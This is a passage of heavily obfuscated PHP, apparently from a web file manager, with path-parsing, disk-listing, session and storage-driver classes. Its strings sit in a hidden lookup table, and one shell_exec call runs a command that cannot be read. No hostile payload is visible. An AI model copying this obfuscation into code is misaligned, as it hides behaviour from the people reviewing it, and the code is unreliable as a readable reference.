!1, $Å∏ÖÏÔì[87] => $˛âﬁ∞ûÎ, $Å∏ÖÏÔì[1247] => !1, $Å∏ÖÏÔì[1246] => $Å∏ÖÏÔì[12]); if (is_array($∑–ÃÌÃ·) && count($∑–ÃÌÃ·) == 5) { $«ÖòãÄ = $Å∏ÖÏÔì[1350] . $∑–ÃÌÃ·[2] . $Å∏ÖÏÔì[412]; if (in_array($«ÖòãÄ, $»õµË®˙)) { $éüïÓ€±[$Å∏ÖÏÔì[1247]] = $∑–ÃÌÃ·[1]; $éüïÓ€±[$Å∏ÖÏÔì[33]] = $«ÖòãÄ; $éüïÓ€±[$Å∏ÖÏÔì[1351]] = substr($«ÖòãÄ, 1, -1); $éüïÓ€±[$Å∏ÖÏÔì[483]] = $∑–ÃÌÃ·[3]; } $éüïÓ€±[$Å∏ÖÏÔì[1246]] = $∑–ÃÌÃ·[4]; } $ÈÏÑÙÓ˜ = array($Å∏ÖÏÔì[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $éüïÓ€±[$Å∏ÖÏÔì[1314]] = in_array($éüïÓ€±[$Å∏ÖÏÔì[33]], $ÈÏÑÙÓ˜); return $éüïÓ€±; } public static function isTruePath($≤ˆ€¶”¨) { $›äú‹ˆû =& $_SERVER[ß⁄ˆÇ†Œ]; if (substr($≤ˆ€¶”¨, 0, 1) != $›äú‹ˆû[1350]) { return !0; } if (strpos($≤ˆ€¶”¨, $›äú‹ˆû[491]) === 0) { return !0; } if (strpos($≤ˆ€¶”¨, $›äú‹ˆû[1318]) === 0) { return !0; } if (strpos($≤ˆ€¶”¨, $›äú‹ˆû[1352]) === 0) { return !0; } if (strpos($≤ˆ€¶”¨, $›äú‹ˆû[1353]) === 0) { return !0; } if (strpos($≤ˆ€¶”¨, $›äú‹ˆû[1354]) === 0) { return !0; } return !1; } public static function clear($ˆ“ΩÇñë) { $á⁄ØÔÛç =& $_SERVER[ß⁄ˆÇ†Œ]; $ˆ“ΩÇñë = str_replace(array($á⁄ØÔÛç[1153], $á⁄ØÔÛç[262]), $á⁄ØÔÛç[53], $ˆ“ΩÇñë); $ˆ“ΩÇñë = str_replace($á⁄ØÔÛç[100], $á⁄ØÔÛç[8], $ˆ“ΩÇñë); $ù—±Ωﬁﬂ = $á⁄ØÔÛç[1355]; if (substr($ˆ“ΩÇñë, 0, 3) == $á⁄ØÔÛç[1356]) { $ˆ“ΩÇñë = substr($ˆ“ΩÇñë, 3); } while (strstr($ˆ“ΩÇñë, $ù—±Ωﬁﬂ)) { $ˆ“ΩÇñë = str_replace($ù—±Ωﬁﬂ, $á⁄ØÔÛç[8], $ˆ“ΩÇñë); } $ˆ“ΩÇñë = preg_replace($á⁄ØÔÛç[1357], $á⁄ØÔÛç[8], $ˆ“ΩÇñë); if ($ˆ“ΩÇñë == $á⁄ØÔÛç[8]) { return $á⁄ØÔÛç[8]; } $ˆ“ΩÇñë = rtrim($ˆ“ΩÇñë, $á⁄ØÔÛç[8]); return $ˆ“ΩÇñë; } public static function pathTrue($–Áû”∫Õ) { $∞ﬁπÇ©§ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$–Áû”∫Õ) { return $∞ﬁπÇ©§[12]; } $–Áû”∫Õ = str_replace($∞ﬁπÇ©§[600], $∞ﬁπÇ©§[8], str_replace($∞ﬁπÇ©§[1358], $∞ﬁπÇ©§[8], $–Áû”∫Õ)); $–Áû”∫Õ = str_replace($∞ﬁπÇ©§[600], $∞ﬁπÇ©§[8], str_replace($∞ﬁπÇ©§[1358], $∞ﬁπÇ©§[8], $–Áû”∫Õ)); if (!strstr($–Áû”∫Õ, $∞ﬁπÇ©§[1356])) { return $–Áû”∫Õ; } $ìΩèœÿò = explode($∞ﬁπÇ©§[8], $–Áû”∫Õ); foreach ($ìΩèœÿò as $Öπ„ç™ú => $‹öêÌ˙Ê) { if ($‹öêÌ˙Ê !== $∞ﬁπÇ©§[1359]) { continue; } for ($¿ÆŒñøê = $Öπ„ç™ú; $¿ÆŒñøê >= 0; $¿ÆŒñøê--) { if ($ìΩèœÿò[$¿ÆŒñøê] === $∞ﬁπÇ©§[10] || $ìΩèœÿò[$¿ÆŒñøê] === $∞ﬁπÇ©§[1359] || $ìΩèœÿò[$¿ÆŒñøê] === -1) { continue; } if ($ìΩèœÿò[$¿ÆŒñøê] === $∞ﬁπÇ©§[12]) { $ìΩèœÿò[$Öπ„ç™ú] = -1; break; } $ìΩèœÿò[$Öπ„ç™ú] = -1; $ìΩèœÿò[$¿ÆŒñøê] = -1; break; } } $ „÷óßÔ = array(); foreach ($ìΩèœÿò as $‹öêÌ˙Ê) { if ($‹öêÌ˙Ê !== -1) { $ „÷óßÔ[] = $‹öêÌ˙Ê; } } $Á¥å¿ôØ = implode($∞ﬁπÇ©§[8], $ „÷óßÔ); if (strpos($Á¥å¿ôØ, $∞ﬁπÇ©§[1360]) === 0) { $Á¥å¿ôØ = $∞ﬁπÇ©§[1356] . substr($Á¥å¿ôØ, strlen($∞ﬁπÇ©§[1360])); } return $Á¥å¿ôØ; } public static function pathUrlClear($ŒııÂù™) { $¨ÆÙÛªª =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ŒııÂù™) { return $ŒııÂù™; } $ŒııÂù™ = rawurldecode($ŒııÂù™); $ŒııÂù™ = str_replace($¨ÆÙÛªª[1358], $¨ÆÙÛªª[8], $ŒııÂù™); if (strpos($ŒııÂù™, $¨ÆÙÛªª[76]) > 0) { $ŒııÂù™ = substr($ŒııÂù™, 0, strpos($ŒııÂù™, $¨ÆÙÛªª[76])); } if (strpos($ŒııÂù™, $¨ÆÙÛªª[1361]) > 0) { $ŒııÂù™ = substr($ŒııÂù™, 0, strpos($ŒııÂù™, $¨ÆÙÛªª[1361])); } return $ŒııÂù™; } public static function sourceID($÷¢ÙËøï) { $˙œ„⁄Àú =& $_SERVER[ß⁄ˆÇ†Œ]; $Ÿ¶√˘±ñ = self::parse($÷¢ÙËøï); if ($Ÿ¶√˘±ñ[$˙œ„⁄Àú[33]] !== self::KOD_SOURCE) { show_json(LNG($˙œ„⁄Àú[1362]), !1); } return $Ÿ¶√˘±ñ[$˙œ„⁄Àú[483]]; } public static function make($»¢Ñ»∫À) { if (!$»¢Ñ»∫À) { return !1; } return self::makePath(self::KOD_SOURCE, intval($»¢Ñ»∫À)); } public static function makeShare($≤¸à‰åÌ, $ﬁÙäõ∂§) { return self::makePath(self::KOD_SHARE_ITEM, $≤¸à‰åÌ, $ﬁÙäõ∂§); } public static function makeFileTypePath($ç∞¡ò˘ä) { return self::makePath(self::KOD_USER_FILE_TYPE, $ç∞¡ò˘ä); } public static function makeFileTagPath($⁄ï¢àÑ€) { return self::makePath(self::KOD_USER_FILE_TAG, $⁄ï¢àÑ€); } public static function makePath($∫Ó™‰¢¬, $≠∞Ùƒíˆ = '', $áô∞∞ÉŒ = '') { $Ñ˘¸˜ª› =& $_SERVER[ß⁄ˆÇ†Œ]; $Ñ˛éŸ˝É = substr($∫Ó™‰¢¬, 1, -1); $Õ”–¥Ω = $Ñ˘¸˜ª›[1363] . $Ñ˛éŸ˝É . $Ñ˘¸˜ª›[1364] . $≠∞Ùƒíˆ . $Ñ˘¸˜ª›[1365]; $Õ”–¥Ω = $áô∞∞ÉŒ ? $Õ”–¥Ω . $áô∞∞ÉŒ . $Ñ˘¸˜ª›[8] : $Õ”–¥Ω; return $Õ”–¥Ω; } public static function hashPath($ÊÉ∑ö†Ï, $Ÿ£ÖöÃÁ = true) { $∞˚∂·Á’ =& $_SERVER[ß⁄ˆÇ†Œ]; $ì®Ÿ»≥‰ = is_array($ÊÉ∑ö†Ï) ? $ÊÉ∑ö†Ï : IO::info($ÊÉ∑ö†Ï); $Ô¶¥âﬂ„ = _get($ì®Ÿ»≥‰, $∞˚∂·Á’[1366], $∞˚∂·Á’[12]); if (!$Ô¶¥âﬂ„ && isset($ì®Ÿ»≥‰[$∞˚∂·Á’[235]])) { $Ô¶¥âﬂ„ = trim($ì®Ÿ»≥‰[$∞˚∂·Á’[235]], $∞˚∂·Á’[121]); } if (!$Ô¶¥âﬂ„ && isset($ì®Ÿ»≥‰[$∞˚∂·Á’[193]]) && $ì®Ÿ»≥‰[$∞˚∂·Á’[193]]) { $ì®Ÿ»≥‰ = IO::info(KodIO::make($ì®Ÿ»≥‰[$∞˚∂·Á’[193]])); $Ô¶¥âﬂ„ = _get($ì®Ÿ»≥‰, $∞˚∂·Á’[1366], $∞˚∂·Á’[12]); } $é”“™–¸ = md5($ì®Ÿ»≥‰[$∞˚∂·Á’[87]] . $ì®Ÿ»≥‰[$∞˚∂·Á’[79]] . $ì®Ÿ»≥‰[$∞˚∂·Á’[88]]); if (!$Ô¶¥âﬂ„ && file_exists($ì®Ÿ»≥‰[$∞˚∂·Á’[87]])) { $Ô¶¥âﬂ„ = Cache::get($é”“™–¸ . $∞˚∂·Á’[1367]); $Ô¶¥âﬂ„ = !1; if (!$Ô¶¥âﬂ„) { $Ô¶¥âﬂ„ = IO::hashSimple($ì®Ÿ»≥‰[$∞˚∂·Á’[87]]); Cache::set($é”“™–¸ . $∞˚∂·Á’[1367], $Ô¶¥âﬂ„, 3600 * 24 * 30); } } if ($Ÿ£ÖöÃÁ && !$Ô¶¥âﬂ„) { } return $Ô¶¥âﬂ„ ? $Ô¶¥âﬂ„ : $é”“™–¸; } public static function hashPathSafe($©Û›÷¥†, $ﬂ◊◊ÚÅõ = true) { $öÓÒ‘π¬ =& $_SERVER[ß⁄ˆÇ†Œ]; $˛ƒÑ˛Ôç = self::hashPath($©Û›÷¥†, $ﬂ◊◊ÚÅõ); return md5($˛ƒÑ˛Ôç . $öÓÒ‘π¬[1368] . Model($öÓÒ‘π¬[843])->get($öÓÒ‘π¬[844])); } public static function initSystemPath() { $•≥ÎˆÑ∫ =& $_SERVER[ß⁄ˆÇ†Œ]; if (defined($•≥ÎˆÑ∫[1369])) { return; } define($•≥ÎˆÑ∫[1369], self::systemPath($•≥ÎˆÑ∫[191])); define($•≥ÎˆÑ∫[1370], self::systemPath($•≥ÎˆÑ∫[1371])); define($•≥ÎˆÑ∫[1372], self::systemPath($•≥ÎˆÑ∫[1373])); define($•≥ÎˆÑ∫[1374], self::systemPath($•≥ÎˆÑ∫[1375])); IOHistory::bindEvent(); } public static function systemPath($ö¬„˜–º) { $ºÌÂœÊ≤ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ç¢Åõèà = $ºÌÂœÊ≤[1376] . ucfirst($ö¬„˜–º); $±îª◊’ = Model($ºÌÂœÊ≤[843])->get($Ç¢Åõèà); if ($±îª◊’) { return $±îª◊’; } if ($ö¬„˜–º == $ºÌÂœÊ≤[191]) { $±îª◊’ = self::make(Model($ºÌÂœÊ≤[897])->systemRootPathAdd($ºÌÂœÊ≤[613])); } else { $±îª◊’ = self::systemPath($ºÌÂœÊ≤[191]); $°êÊÌ∫ = self::sourceID($±îª◊’); $±îª◊’ = self::make(Model($ºÌÂœÊ≤[897])->mkdir($°êÊÌ∫, $ö¬„˜–º)); } Model($ºÌÂœÊ≤[843])->set($Ç¢Åõèà, $±îª◊’); return $±îª◊’; } public static function systemFolder($Í¯ÓÙ√Ù) { $Éï∞†â≈ = IO_PATH_SYSTEM_SOURCE . $Í¯ÓÙ√Ù; $ÇÊˆøÁÂ = Cache::get($Éï∞†â≈); if (!$ÇÊˆøÁÂ) { $Û¢àËÌƒ = IO::infoFullSimple($Éï∞†â≈); if (!$Û¢àËÌƒ) { $ÇÊˆøÁÂ = IO::mkdir($Éï∞†â≈, REPEAT_SKIP); } else { $ÇÊˆøÁÂ = $Û¢àËÌƒ[$_SERVER[ß⁄ˆÇ†Œ][87]]; } Cache::set($Éï∞†â≈, $ÇÊˆøÁÂ, 3600 * 10); } return $ÇÊˆøÁÂ; } public static function defaultDriver() { return Model($_SERVER[ß⁄ˆÇ†Œ][840])->defaultDriver(); } public static function defaultIO() { $Å—èÑ“› =& $_SERVER[ß⁄ˆÇ†Œ]; $√…é˘¯ﬂ = self::defaultDriver(); return $Å—èÑ“›[1377] . $√…é˘¯ﬂ[$Å—èÑ“›[483]] . $Å—èÑ“›[1365]; } public static function defaultDriverInit() { static $´ñ†»¨˘ = false; if ($´ñ†»¨˘) { return $´ñ†»¨˘; } $´ñ†»¨˘ = IO::init(self::defaultIO()); return $´ñ†»¨˘; } public static function fileTypeList() { $âﬂπ»˜— =& $_SERVER[ß⁄ˆÇ†Œ]; $´´Ÿ–§¯ = $GLOBALS[$âﬂπ»˜—[6]][$âﬂπ»˜—[1378]]; foreach ($´´Ÿ–§¯ as $Ç›“∂‡é => $•ÀﬁõÀ∂) { $¡—ƒ£ê¯ = $âﬂπ»˜—[1379] . $Ç›“∂‡é; $ﬂﬂ—ã‡∞ = LNG($¡—ƒ£ê¯); if ($¡—ƒ£ê¯ != $ﬂﬂ—ã‡∞) { $´´Ÿ–§¯[$Ç›“∂‡é][$âﬂπ»˜—[32]] = $ﬂﬂ—ã‡∞; } } return $´´Ÿ–§¯; } public static function diskList($¡ÏöºΩ© = true) { $éÆ–ê…õ = $_SERVER[ß⁄ˆÇ†Œ][1380]; if ($¡ÏöºΩ©) { $Ä®“’ÿõ = Cache::get($éÆ–ê…õ); if (is_array($Ä®“’ÿõ)) { return $Ä®“’ÿõ; } } $Ä®“’ÿõ = self::diskListGet(); Cache::set($éÆ–ê…õ, $Ä®“’ÿõ, 60); return $Ä®“’ÿõ; } public static function diskListGet() { $¶ÍÇêµ— =& $_SERVER[ß⁄ˆÇ†Œ]; $›Í£¿ﬁ» = array(); if ($GLOBALS[$¶ÍÇêµ—[6]][$¶ÍÇêµ—[1381]] == $¶ÍÇêµ—[1382]) { $»≠òÕÍê = $¶ÍÇêµ—[1383]; for ($©€ô¡ÁÕ = 0; $©€ô¡ÁÕ < strlen($»≠òÕÍê); $©€ô¡ÁÕ++) { $Ü“õÒá = $»≠òÕÍê[$©€ô¡ÁÕ] . $¶ÍÇêµ—[1384]; if (file_exists($Ü“õÒá)) { $›Í£¿ﬁ»[] = $Ü“õÒá; } } return $›Í£¿ﬁ»; } if (!function_exists($¶ÍÇêµ—[101])) { $›Í£¿ﬁ»[] = $¶ÍÇêµ—[908]; return $›Í£¿ﬁ»; } $Œªí˜ﬁù = explode($¶ÍÇêµ—[262], shell_exec($¶ÍÇêµ—[1385])); array_shift($Œªí˜ﬁù); array_pop($Œªí˜ﬁù); $ıº˛‘Ë¬ = array($¶ÍÇêµ—[1386], $¶ÍÇêµ—[1387], $¶ÍÇêµ—[1388], $¶ÍÇêµ—[1389], $¶ÍÇêµ—[1390], $¶ÍÇêµ—[1391], $¶ÍÇêµ—[1392], $¶ÍÇêµ—[1393]); foreach ($Œªí˜ﬁù as $‡Àá¸¢ç) { $ÜÄÆ›°è = preg_split($¶ÍÇêµ—[1394], $‡Àá¸¢ç); $Ü“õÒá = $ÜÄÆ›°è[count($ÜÄÆ›°è) - 1]; if (!strstr($ÜÄÆ›°è[0], $¶ÍÇêµ—[1395]) || !$Ü“õÒá) { continue; } $Ï·™§Åô = rtrim($Ü“õÒá, $¶ÍÇêµ—[8]) . $¶ÍÇêµ—[8]; if (in_array($Ï·™§Åô, $ıº˛‘Ë¬)) { continue; } $›Í£¿ﬁ»[] = $Ï·™§Åô; } return $›Í£¿ﬁ»; } public static function isSameDisk($ë”û«ßê, $»Ø…Ó’Â) { $ºßÆﬂÈò =& $_SERVER[ß⁄ˆÇ†Œ]; if ($GLOBALS[$ºßÆﬂÈò[6]][$ºßÆﬂÈò[1381]] == $ºßÆﬂÈò[1382]) { return strtolower(substr($ë”û«ßê, 0, 1)) == strtolower(substr($»Ø…Ó’Â, 0, 1)); } $ÀªÌìî÷ = self::diskList(); $à⁄“§ûÙ = !1; $ÃÔ≤Á∫Ë = !1; sort($ÀªÌìî÷); $ÀªÌìî÷ = array_reverse($ÀªÌìî÷); $ë”û«ßê = rtrim($ë”û«ßê, $ºßÆﬂÈò[8]) . $ºßÆﬂÈò[8]; $»Ø…Ó’Â = rtrim($»Ø…Ó’Â, $ºßÆﬂÈò[8]) . $ºßÆﬂÈò[8]; foreach ($ÀªÌìî÷ as $àΩîºï’) { $Ñ‚Õ¥Íñ = strlen($àΩîºï’); if (!$à⁄“§ûÙ && substr($ë”û«ßê, 0, $Ñ‚Õ¥Íñ) == $àΩîºï’) { $à⁄“§ûÙ = $àΩîºï’; } if (!$ÃÔ≤Á∫Ë && substr($»Ø…Ó’Â, 0, $Ñ‚Õ¥Íñ) == $àΩîºï’) { $ÃÔ≤Á∫Ë = $àΩîºï’; } if ($à⁄“§ûÙ && $ÃÔ≤Á∫Ë) { break; } } return $à⁄“§ûÙ === $ÃÔ≤Á∫Ë; } public static function transferType($Û√Ω©ÙÃ, $Á∑∂Î–) { $©∞Ú´Á‡ =& $_SERVER[ß⁄ˆÇ†Œ]; $≤Á‹öÜÌ = self::driverType($Û√Ω©ÙÃ); $™òÖ¿Àñ = self::driverType($Á∑∂Î–); if ($≤Á‹öÜÌ[$©∞Ú´Á‡[33]] == $™òÖ¿Àñ[$©∞Ú´Á‡[33]] && $≤Á‹öÜÌ[$©∞Ú´Á‡[1396]] == $™òÖ¿Àñ[$©∞Ú´Á‡[1396]]) { return $©∞Ú´Á‡[1397]; } if ($≤Á‹öÜÌ[$©∞Ú´Á‡[33]] == $©∞Ú´Á‡[942] && $™òÖ¿Àñ[$©∞Ú´Á‡[33]] == $©∞Ú´Á‡[109]) { return $©∞Ú´Á‡[1275]; } if ($≤Á‹öÜÌ[$©∞Ú´Á‡[33]] == $©∞Ú´Á‡[109] && $™òÖ¿Àñ[$©∞Ú´Á‡[33]] == $©∞Ú´Á‡[942]) { return $©∞Ú´Á‡[110]; } return $©∞Ú´Á‡[1398]; } public static function driverType($ÒÁ–÷ò„) { $‰¿ÑÍ—† =& $_SERVER[ß⁄ˆÇ†Œ]; $êÏ†ŒÁë = str_replace($‰¿ÑÍ—†[1399], $‰¿ÑÍ—†[12], strtolower($ÒÁ–÷ò„->getType())); if ($êÏ†ŒÁë == $‰¿ÑÍ—†[830] || $êÏ†ŒÁë == $‰¿ÑÍ—†[1400] || $êÏ†ŒÁë == $‰¿ÑÍ—†[1401]) { $ÒÁ–÷ò„ = self::defaultDriverInit(); } else { if ($êÏ†ŒÁë == $‰¿ÑÍ—†[1285] || $êÏ†ŒÁë == $‰¿ÑÍ—†[1402]) { $ÒÁ–÷ò„ = IO::init($ÒÁ–÷ò„->pathParse[$‰¿ÑÍ—†[1228]]); } } $Æã÷Ç—ó = $ÒÁ–÷ò„->path; $êÏ†ŒÁë = str_replace($‰¿ÑÍ—†[1399], $‰¿ÑÍ—†[12], strtolower($ÒÁ–÷ò„->getType())); if ($êÏ†ŒÁë == $‰¿ÑÍ—†[109]) { return array($‰¿ÑÍ—†[33] => $‰¿ÑÍ—†[109], $‰¿ÑÍ—†[1396] => $‰¿ÑÍ—†[12], $‰¿ÑÍ—†[87] => $Æã÷Ç—ó, $‰¿ÑÍ—†[98] => $ÒÁ–÷ò„); } return array($‰¿ÑÍ—†[33] => $‰¿ÑÍ—†[942], $‰¿ÑÍ—†[1396] => $ÒÁ–÷ò„->pathDriver, $‰¿ÑÍ—†[87] => $Æã÷Ç—ó, $‰¿ÑÍ—†[98] => $ÒÁ–÷ò„); } public static function pathDriverType($»Å‘©àÇ) { return $»Å‘©àÇ ? self::driverType(IO::init($»Å‘©àÇ)) : !1; } public static function pathDriverLocal($è÷˘é˜Ò) { $¸ª¶ﬂ®ç =& $_SERVER[ß⁄ˆÇ†Œ]; $â∞¸…¥∞ = $è÷˘é˜Ò ? self::driverType(IO::init($è÷˘é˜Ò)) : !1; return strtolower($â∞¸…¥∞[$¸ª¶ﬂ®ç[33]]) == $¸ª¶ﬂ®ç[109] ? !0 : !1; } public static function allowCover($ÙÙ©’ôÙ, $°õïÍƒ√ = true) { $ü∫¬Í´¬ =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_string($ÙÙ©’ôÙ)) { $ÙÙ©’ôÙ = IO::info($ÙÙ©’ôÙ); } if (!$ÙÙ©’ôÙ || $ÙÙ©’ôÙ[$ü∫¬Í´¬[33]] == $ü∫¬Í´¬[78] || $ÙÙ©’ôÙ[$ü∫¬Í´¬[79]] <= 100) { return !1; } if (isset($ÙÙ©’ôÙ[$ü∫¬Í´¬[1403]]) || !$ÙÙ©’ôÙ[$ü∫¬Í´¬[87]]) { return !1; } if (isset($ÙÙ©’ôÙ[$ü∫¬Í´¬[232]]) && !$ÙÙ©’ôÙ[$ü∫¬Í´¬[232]]) { return !1; } static $ì∞çªÚ≈ = false; if (!$ì∞çªÚ≈ || !$°õïÍƒ√) { $‡ÈªË¥˝ = self::driverType(IO::init($ÙÙ©’ôÙ[$ü∫¬Í´¬[87]])); $Œ“áºâÀ = $‡ÈªË¥˝[$ü∫¬Í´¬[98]]; $ì∞çªÚ≈ = $ü∫¬Í´¬[196]; if ($‡ÈªË¥˝[$ü∫¬Í´¬[33]] == $ü∫¬Í´¬[109]) { $ì∞çªÚ≈ = $ü∫¬Í´¬[1404]; } if ($‡ÈªË¥˝[$ü∫¬Í´¬[98]] && is_array($‡ÈªË¥˝[$ü∫¬Í´¬[98]]->config)) { $¿ﬂ˚Œåî = $‡ÈªË¥˝[$ü∫¬Í´¬[98]]->config; if (isset($¿ﬂ˚Œåî[$ü∫¬Í´¬[1405]]) && $¿ﬂ˚Œåî[$ü∫¬Í´¬[1405]]) { $ì∞çªÚ≈ = $ü∫¬Í´¬[1404]; } } $∫€Ôƒœ˛ = KodIO::defaultDriver(); if (strtolower($∫€Ôƒœ˛[$ü∫¬Í´¬[98]]) == $ü∫¬Í´¬[109] && is_array($∫€Ôƒœ˛[$ü∫¬Í´¬[6]])) { $÷ï—Ù˝⁄ = $∫€Ôƒœ˛[$ü∫¬Í´¬[6]][$ü∫¬Í´¬[1258]]; if (substr($÷ï—Ù˝⁄, 0, 2) == $ü∫¬Í´¬[1406]) { $÷ï—Ù˝⁄ = str_replace($ü∫¬Í´¬[1406], BASIC_PATH, $÷ï—Ù˝⁄); } $÷ï—Ù˝⁄ = str_replace($ü∫¬Í´¬[600], $ü∫¬Í´¬[8], $÷ï—Ù˝⁄); if (substr($ÙÙ©’ôÙ[$ü∫¬Í´¬[87]], 0, strlen($÷ï—Ù˝⁄)) == $÷ï—Ù˝⁄) { $ì∞çªÚ≈ = $ü∫¬Í´¬[196]; } } } return $ì∞çªÚ≈ == $ü∫¬Í´¬[1404] ? !0 : !1; } } goto a„÷ïùÒ¥®; d‹ç¡õÖôë: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\x6d\x5f\163\x65\x73\163\x69\x6f\x6e"; public function get($®áøºÁÙ) { $π¿îù¥ü =& $_SERVER[ß⁄ˆÇ†Œ]; $àÍá¢È¶ = $this->where(array($π¿îù¥ü[2102] => $®áøºÁÙ))->find(); if (!is_array($àÍá¢È¶)) { return !1; } return $àÍá¢È¶[$π¿îù¥ü[171]]; } public function set($¿éˆÈêµ, $êóÊúË, $†„ô´éæ = 3600) { $æ†Éê´∂ =& $_SERVER[ß⁄ˆÇ†Œ]; $∂Ò£ñˆï = array($æ†Éê´∂[2102] => $¿éˆÈêµ, $æ†Éê´∂[2002] => $êóÊúË, $æ†Éê´∂[2103] => $†„ô´éæ + time()); if (Session::get($æ†Éê´∂[2104])) { $∂Ò£ñˆï[$æ†Éê´∂[1764]] = Session::get($æ†Éê´∂[2104]); } else { $∂Ò£ñˆï[$æ†Éê´∂[1764]] = 0; } if ($this->get($¿éˆÈêµ)) { return $this->where(array($æ†Éê´∂[2102] => $¿éˆÈêµ))->save($∂Ò£ñˆï); } else { return $this->add($∂Ò£ñˆï, array(), !0); } } public function remove($ÇËê‘‹Ω) { return $this->where(array($_SERVER[ß⁄ˆÇ†Œ][2102] => $ÇËê‘‹Ω))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ß⁄ˆÇ†Œ][2105] . time())->delete(); } } $_file = $_SERVER[$_SERVER[ß⁄ˆÇ†Œ][322]]; $_size = $_SERVER[ß⁄ˆÇ†Œ][950]; goto fì…·ñÈﬁΩ; C”Üìü”°Ô: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ñ∑˜”¯Å =& $_SERVER[ß⁄ˆÇ†Œ]; $this->objectDriver = array($ñ∑˜”¯Å[60], $ñ∑˜”¯Å[61], $ñ∑˜”¯Å[62], $ñ∑˜”¯Å[63], $ñ∑˜”¯Å[64], $ñ∑˜”¯Å[65], $ñ∑˜”¯Å[66], $ñ∑˜”¯Å[67], $ñ∑˜”¯Å[68], $ñ∑˜”¯Å[69], $ñ∑˜”¯Å[70], $ñ∑˜”¯Å[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Éƒó˘≤ú) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Éƒó˘≤ú, $_SERVER[ß⁄ˆÇ†Œ][8]); } return $Éƒó˘≤ú; } public function iconvApp($ƒñ˙£°Û) { return $ƒñ˙£°Û; } public function iconvSystem($◊◊œÚù¨) { return $◊◊œÚù¨; } public function iconvTo($ôŸ‹¿…Ë, $≤“Ô—ù”, $Ôµ◊†µÅ) { $›±ôô”á =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ôŸ‹¿…Ë || !function_exists($›±ôô”á[72])) { return $ôŸ‹¿…Ë; } static $ñÉ˚ºÍ = array(); $Ì ÅÙÙº = $≤“Ô—ù” . $›±ôô”á[73] . $Ôµ◊†µÅ . $›±ôô”á[74] . $ôŸ‹¿…Ë; if (isset($ñÉ˚ºÍ[$Ì ÅÙÙº])) { return $ñÉ˚ºÍ[$Ì ÅÙÙº]; } if (function_exists($›±ôô”á[75])) { $á¿ŒïâÀ = @mb_convert_encoding($ôŸ‹¿…Ë, $Ôµ◊†µÅ, $≤“Ô—ù”); } else { $á¿ŒïâÀ = @iconv($≤“Ô—ù”, $Ôµ◊†µÅ, $ôŸ‹¿…Ë); } $á¿ŒïâÀ = $á¿ŒïâÀ ? $á¿ŒïâÀ : $ôŸ‹¿…Ë; if (strstr($á¿ŒïâÀ, $›±ôô”á[76])) { $á¿ŒïâÀ = str_replace($›±ôô”á[76], $›±ôô”á[11], $á¿ŒïâÀ); } $ñÉ˚ºÍ[$≤“Ô—ù” . $›±ôô”á[73] . $Ôµ◊†µÅ . $›±ôô”á[74] . $ôŸ‹¿…Ë] = $á¿ŒïâÀ; $ñÉ˚ºÍ[$Ôµ◊†µÅ . $›±ôô”á[73] . $≤“Ô—ù” . $›±ôô”á[74] . $ôŸ‹¿…Ë] = $ôŸ‹¿…Ë; $ñÉ˚ºÍ[$Ôµ◊†µÅ . $›±ôô”á[73] . $≤“Ô—ù” . $›±ôô”á[74] . $á¿ŒïâÀ] = $ôŸ‹¿…Ë; $ñÉ˚ºÍ[$≤“Ô—ù” . $›±ôô”á[73] . $Ôµ◊†µÅ . $›±ôô”á[74] . $á¿ŒïâÀ] = $á¿ŒïâÀ; return $á¿ŒïâÀ; } public function getPathInner($ˆãœëˆ) { $∏æ◊¶ˆå = IO::init($ˆãœëˆ); return $∏æ◊¶ˆå->path; } public function getPathOuter($–®éõ¥˛) { $ü—ûŸ ¢ =& $_SERVER[ß⁄ˆÇ†Œ]; $òÒ°⁄∫µ = strlen(trim($this->pathBase, $ü—ûŸ ¢[8])); $–®éõ¥˛ = substr(trim($–®éõ¥˛, $ü—ûŸ ¢[8]), $òÒ°⁄∫µ); return $this->pathDriver . $ü—ûŸ ¢[8] . ltrim($–®éõ¥˛, $ü—ûŸ ¢[8]); } public function isParentOf($¬∞ ÄÿÕ, $‹˛Àó´∆) { $…ﬁæñ¬« =& $_SERVER[ß⁄ˆÇ†Œ]; $¬∞ ÄÿÕ = rtrim(strtolower($¬∞ ÄÿÕ), $…ﬁæñ¬«[8]) . $…ﬁæñ¬«[8]; $‹˛Àó´∆ = rtrim(strtolower($‹˛Àó´∆), $…ﬁæñ¬«[8]) . $…ﬁæñ¬«[8]; $´”à¸·¯ = strpos($‹˛Àó´∆, $¬∞ ÄÿÕ) === 0; return $´”à¸·¯; } public function getType() { $æã‡®Ø⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; $ü≥ù‡≥¿ = str_replace($æã‡®Ø⁄[77], $æã‡®Ø⁄[12], get_class($this)); return strtolower($ü≥ù‡≥¿); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($õ“Ω˘∆ë, $Ö«÷Òø–) { $å€Ê√ú« =& $_SERVER[ß⁄ˆÇ†Œ]; $ﬁ÷Ÿ≤™„ = rtrim($õ“Ω˘∆ë, $å€Ê√ú«[8]) . $å€Ê√ú«[8] . $Ö«÷Òø–; $—ãÁ–§¡ = $this->exist($ﬁ÷Ÿ≤™„); return $—ãÁ–§¡ ? $ﬁ÷Ÿ≤™„ : !1; } public function setModifyTime($ñ˛†±˛¯, $ˆÆ≠±æÔ = '') { } public function renameObject($¯õÃ› ∫, $÷¿˜ºÀ) { $…Õ˘˛∂Å = $÷¿˜ºÀ; $¯õÃ› ∫ = $this->getPathOuter($¯õÃ› ∫); $÷¿˜ºÀ = $this->pathFather($¯õÃ› ∫) . $÷¿˜ºÀ; $‘ñÛ÷Öö = IO::copy($¯õÃ› ∫, $this->pathFather($¯õÃ› ∫), REPEAT_RENAME_FOLDER, $…Õ˘˛∂Å); if ($‘ñÛ÷Öö) { IO::remove($¯õÃ› ∫); } return $‘ñÛ÷Öö ? $÷¿˜ºÀ : !1; } public function 